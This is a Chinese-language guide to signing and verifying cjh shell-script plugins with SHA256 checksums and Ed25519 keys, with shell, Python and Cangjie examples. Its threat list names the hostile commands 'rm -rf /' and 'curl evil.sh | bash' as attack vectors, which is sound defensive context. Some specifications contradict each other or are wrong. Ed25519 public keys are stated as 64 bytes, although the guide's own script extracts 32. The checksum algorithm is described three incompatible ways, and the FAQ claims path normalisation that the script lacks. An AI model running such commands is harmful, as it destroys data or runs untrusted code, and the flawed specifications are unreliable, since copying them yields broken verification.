# cjh 插件签名与贡献指南

> 版本：V3 信任链 Step 1（校验和）+ Step 2 预留（Ed25519 签名）
> 适用：cjh v1.3.0+
> 日期：2026-08-26

## 一、为什么需要签名？

cjh 插件本质是 **shell 脚本**，加载即获得执行能力。没有信任链时，攻击向量包括：

- **供应链投毒**：插件仓库被入侵，`echo_hi.sh` 被替换成 `rm -rf /`
- **中间人篡改**：下载传输中插件包被改
- **恶意发布者**：任何人发个插件，`plugin.json` 里 `"command": "curl evil.sh | bash"`

**信任链回答三个问题**：

| 问题 | 机制 | 状态 |
|---|---|---|
| 插件被篡改过吗？ | SHA256 校验和 | ✅ Step 1 已实现 |
| 这个插件是谁发的？ | Ed25519 签名 | ⚠️ Step 2 预留 |
| 我该不该信这个发布者？ | 发布者信任列表 | ⚠️ Step 3 待实现 |

## 二、plugin.json 字段规范

### 2.1 基础字段（V2b Step 1，必填）

```json
{
  "name": "my-plugin",
  "version": "1.0.0",
  "tools": [
    {
      "name": "greet",
      "description": "Print a greeting",
      "command": "greet.sh",
      "is_read_only": true,
      "parameters": {
        "type": "object",
        "properties": {
          "who": { "type": "string", "description": "Who to greet" }
        },
        "required": ["who"]
      }
    }
  ]
}
```

### 2.2 校验和字段（V3 Step 1，推荐填写）

```json
{
  "name": "my-plugin",
  "version": "1.0.0",
  "checksum": "a1b2c3d4e5f6...（64 位十六进制 SHA256）",
  "tools": [...]
}
```

**`checksum` 计算规则**：

- 对象 = 插件目录下**除 `plugin.json` 外**的所有文件
- 算法 = 递归收集文件 → 按相对路径字典序排序 → 对每个文件 `SHA256(相对路径 + 文件内容)` → 最终拼接再做一次 SHA256
- 结果 = 64 位小写十六进制字符串

**为什么排除 `plugin.json`？** 因为 `plugin.json` 里存了 `checksum` 字段，hash 它会造成循环依赖。

### 2.3 签名字段（V3 Step 2 预留，当前仅记录不验证）

```json
{
  "name": "my-plugin",
  "version": "1.0.0",
  "checksum": "a1b2c3d4...",
  "publisher": "github:alice",
  "pubkey": "9f2a1b8c...（128 位十六进制 Ed25519 公钥，64 字节）",
  "signature": "3e7d5f2a...（128 位十六进制 Ed25519 签名，64 字节）",
  "tools": [...]
}
```

**字段说明**：

| 字段 | 类型 | 说明 |
|---|---|---|
| `publisher` | string | 发布者 ID，格式 `<平台>:<用户名>`（如 `github:alice`） |
| `pubkey` | string | 发布者 Ed25519 公钥，128 位十六进制（64 字节） |
| `signature` | string | 对 `checksum` 字段值的 Ed25519 签名，128 位十六进制（64 字节） |

**签名覆盖范围**：`signature` 签的是 `checksum` 字段的值（那个 64 位十六进制字符串），不是整个 `plugin.json`。因为 `plugin.json` 包含 `signature` 自身，签整个文件会循环依赖。

## 四、发布流程

### 4.1 准备工作

1. **组织插件目录**：确保 `plugin.json` 和所有脚本文件就位
2. **填写基础字段**：`name`、`version`、`tools` 等

### 4.2 计算校验和

cjh 提供内置工具计算校验和（V3 Step 1 已实现 `sha256DirExcluding`）。

**方式一：用 cjh 内置命令**（待 V3 Step 3 实现 CLI）

```bash
cjh plugin checksum ./my-plugin
# 输出：a1b2c3d4e5f6...
```

**方式二：手动计算**（当前可用，等价于 `sha256DirExcluding` 的算法）

```bash
# 1. 收集除 plugin.json 外的所有文件，按相对路径排序
cd ./my-plugin
find . -type f ! -name "plugin.json" | sed 's|^\./||' | sort > /tmp/files.txt

# 2. 对每个文件计算 SHA256(相对路径 + 文件内容)，拼接
> /tmp/concat.bin
while read f; do
    printf '%s' "$f" >> /tmp/concat.bin
    cat "$f" >> /tmp/concat.bin
done < /tmp/files.txt

# 3. 最终 SHA256
sha256sum /tmp/concat.bin | awk '{print $1}'
# 输出：a1b2c3d4e5f6...
```

### 4.3 生成 Ed25519 密钥对（V3 Step 2）

**生成私钥**：

```bash
# 用 openssl 生成 Ed25519 密钥
openssl genpkey -algorithm Ed25519 -out publisher.key

# 提取公钥
openssl pkey -in publisher.key -pubout -out publisher.pub
```

**或用 Python cryptography 库**：

```python
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives import serialization

# 生成密钥对
private_key = Ed25519PrivateKey.generate()
public_key = private_key.public_key()

# 导出
private_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
public_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

with open("publisher.key", "wb") as f:
    f.write(private_pem)
with open("publisher.pub", "wb") as f:
    f.write(public_pem)
```

### 4.4 签名

**用 openssl 签名**：

```bash
# checksum 是上一步计算的 64 位十六进制字符串
CHECKSUM="a1b2c3d4e5f6..."

# 对 checksum 值签名（注意：签的是 checksum 字符串本身）
printf '%s' "$CHECKSUM" > /tmp/checksum.txt
openssl pkeyutl -sign -inkey publisher.key -in /tmp/checksum.txt -out /tmp/sig.bin

# 签名转十六进制
xxd -p -c 256 /tmp/sig.bin
# 输出：3e7d5f2a...（128 位十六进制）
```

**或用 Python**：

```python
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives import serialization

# 加载私钥
with open("publisher.key", "rb") as f:
    private_key = serialization.load_pem_private_key(f.read(), password=None)

# 签名 checksum
checksum = "a1b2c3d4e5f6..."  # 上一步计算的值
signature = private_key.sign(checksum.encode())

# 转十六进制
sig_hex = signature.hex()
print(sig_hex)
# 输出：3e7d5f2a...（128 位十六进制）

# 公钥转十六进制
public_key = private_key.public_key()
pub_bytes = public_key.public_bytes(
    encoding=serialization.Encoding.Raw,
    format=serialization.PublicFormat.Raw
)
pub_hex = pub_bytes.hex()
print(pub_hex)
# 输出：9f2a1b8c...（128 位十六进制）
```

### 4.5 填写 plugin.json

将计算结果填入 `plugin.json`：

```json
{
  "name": "my-plugin",
  "version": "1.0.0",
  "checksum": "a1b2c3d4e5f6...",
  "publisher": "github:alice",
  "pubkey": "9f2a1b8c...",
  "signature": "3e7d5f2a...",
  "tools": [...]
}
```

### 4.6 完整发布脚本示例

```bash
#!/bin/bash
# publish.sh - 插件发布脚本
set -e

PLUGIN_DIR="$1"
if [ -z "$PLUGIN_DIR" ]; then
    echo "Usage: $0 <plugin-dir>"
    exit 1
fi

cd "$PLUGIN_DIR"

# 1. 计算校验和（排除 plugin.json）
find . -type f ! -name "plugin.json" | sed 's|^\./||' | sort > /tmp/files.txt
> /tmp/concat.bin
while read f; do
    printf '%s' "$f" >> /tmp/concat.bin
    cat "$f" >> /tmp/concat.bin
done < /tmp/files.txt
CHECKSUM=$(sha256sum /tmp/concat.bin | awk '{print $1}')
echo "checksum: $CHECKSUM"

# 2. 签名（需要 publisher.key）
if [ ! -f ../publisher.key ]; then
    echo "Error: ../publisher.key not found"
    exit 1
fi
printf '%s' "$CHECKSUM" > /tmp/checksum.txt
openssl pkeyutl -sign -inkey ../publisher.key -in /tmp/checksum.txt -out /tmp/sig.bin
SIG_HEX=$(xxd -p -c 256 /tmp/sig.bin)
echo "signature: $SIG_HEX"

# 3. 公钥十六进制
PUB_HEX=$(openssl pkey -in ../publisher.key -pubout -outform DER 2>/dev/null | tail -c 32 | xxd -p -c 64)
echo "pubkey: $PUB_HEX"

# 4. 更新 plugin.json（用 python 操作 JSON）
python3 -c "
import json
with open('plugin.json', 'r') as f:
    data = json.load(f)
data['checksum'] = '$CHECKSUM'
data['publisher'] = 'github:alice'  # 改成你的 ID
data['pubkey'] = '$PUB_HEX'
data['signature'] = '$SIG_HEX'
with open('plugin.json', 'w') as f:
    json.dump(data, f, indent=2)
"

echo "Done! plugin.json updated with signature."
```

## 五、安装与验证流程

### 5.1 当前已实现（V3 Step 1）

cjh 加载插件时执行以下验证：

```
1. 解析 plugin.json
2. 读取 checksum 字段
3. 如果 checksum 存在：
   a. 计算 sha256DirExcluding(pluginDir, "plugin.json")
   b. 对比计算值与 checksum 字段值
   c. 不匹配 → Log.warn + 拒绝加载
   d. 匹配 → Log.debug "校验和验证通过"
4. 解析 publisher / pubkey / signature 字段（仅记录，V3 Step 2 将验证）
5. 注册工具
```

**效果**：检测插件目录被篡改（攻击者直接改 `.sh` 文件）。不防供应链投毒（攻击者改完文件可以重新算 checksum 并更新 plugin.json）——这是 Step 2 签名要解决的问题。

### 5.2 V3 Step 2 将实现（Ed25519 签名验证）

```
1. Step 1 校验和验证通过
2. 读取 pubkey / signature / publisher
3. 用 pubkey 验证 signature 是否签的是 checksum
4. 验证失败 → 拒绝加载
5. 查 ~/.cjh/trusted-publishers 是否含 publisher 或 pubkey 指纹
6. 不在信任列表 → 提示用户 /cjh trust <publisher>
```

### 5.3 V3 Step 3 将实现（信任管理 CLI）

```bash
# 信任发布者
cjh trust github:alice

# 取消信任
cjh untrust github:alice

# 列出已信任发布者
cjh trust-list

# 安装插件（走签名验证流程）
cjh install https://example.com/my-plugin.cjp
```

## 七、常见问题

### Q1：校验和不匹配怎么办？

**现象**：`[PLUGIN] 校验和不匹配，拒绝加载: my-plugin`

**原因**：插件目录下某个文件被改过，但 `plugin.json` 的 `checksum` 没更新。

**解决**：
1. 如果你是发布者：重新计算校验和，更新 `plugin.json`
2. 如果你是用户：重新下载插件，或确认文件改动是预期的后重新计算校验和

### Q2：可以不填 checksum 吗？

可以。`checksum` 是可选字段。不填时 cjh 不做校验和验证，插件正常加载（但无法检测篡改）。

### Q3：Ed25519 签名什么时候强制？

**当前**：不强制。`publisher` / `pubkey` / `signature` 仅解析记录。

**V3 Step 2 后**：默认不强制（兼容无签名插件），但用户可通过配置 `require_signature = true` 强制要求已安装插件必须有有效签名。

### Q4：如何轮换发布者密钥？

1. 生成新密钥对
2. 用新私钥重新签名所有插件的 `checksum`
3. 更新 `plugin.json` 的 `pubkey` 和 `signature` 字段
4. 用户侧：`/cjh trust <new-pubkey-fingerprint>` 信任新公钥

### Q5：校验和算法为什么这么复杂？

因为需要**确定性**和**跨平台**：
- 文件遍历顺序在不同 OS/FS 上可能不同 → 按相对路径字典序排序
- 路径分隔符 Windows 是 `\`，Unix 是 `/` → 统一为 `/`
- 单独 hash 每个文件再拼接 → 避免大文件一次性读入内存

## 八、参考实现

### 8.1 校验和计算（仓颉）

```cangjie
// libs/cjutil/src/sha256.cj
public func sha256DirExcluding(dirPath: String, excludeFile: String): String {
    // 1. 递归收集目录下所有文件
    // 2. 排除 excludeFile
    // 3. 按相对路径字典序排序
    // 4. 对每个文件 update(hash(相对路径) + hash(文件内容))
    // 5. finish() 返回 32 字节目录指纹的十六进制字符串
}
```

### 8.2 加载时校验（仓颉）

```cangjie
// src/tools/plugin.cj - loadPlugin()
if (expectedChecksum.size > 0) {
    let actualChecksum = sha256DirExcluding(pluginDir, "plugin.json")
    if (actualChecksum != expectedChecksum) {
        Log.warn("[PLUGIN] 校验和不匹配，拒绝加载: ${pluginName}")
        return
    }
}
```
